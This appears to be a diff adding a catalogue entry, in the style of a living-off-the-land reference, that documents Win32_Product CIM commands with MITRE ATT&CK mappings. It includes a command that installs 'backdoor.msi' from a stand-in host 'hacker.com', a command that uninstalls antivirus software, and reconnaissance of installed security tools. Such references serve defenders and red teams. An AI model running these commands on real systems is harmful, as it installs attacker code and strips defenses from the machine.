@@ -1,0 +1,45 @@
+---
+Name: Win32_Product
+Description: Represent products as they are installed by MSI
+Updated: 2023-08-25
+Toolsets:
+  - Builtin
+  - CIMSession
+Commands:
+  - Command: Get-CimInstance -ClassName Win32_Product -CimSession $s | Select-Object Caption,Vendor,Version,InstallLocation
+    Description: List installed software
+    Usecases:
+      - Perform reconnaissance on installed security software
+    Function: Manage
+    Comments:
+      - 'Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'
+      - 'Namespace: `ROOT\Cimv2`'
+    MitreAttack:
+      - T1218.007
+  - Command: 'Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation="https://hacker.com/backdoor.msi"; Options=""; AllUsers=$true} -CimSession $s'
+    Description: Install software
+    Usecases:
+      - Launch and install malicious .msi package
+    Function: Processes
+    Comments:
+      - 'Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'
+      - 'Namespace: `ROOT\Cimv2`'
+      - .msi file needs to be available on the target host
+    MitreAttack:
+      - T1218.007
+  - Command: 'Get-CimInstance Win32_Product -Filter ''Caption="Antivirus Software caption"'' -CimSession $s | Remove-CimInstance'
+    Description: Uninstall software
+    Usecases:
+      - Remove security software
+    Function: Processes
+    Comments:
+      - 'Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'
+      - 'Namespace: `ROOT\Cimv2`'
+    MitreAttack:
+      - T1218.007
+      - T1562.001
+Resources:
+Detections:
+Contributors:
+    - Name: Arris Huijgen
+      Handle: bitsadmin
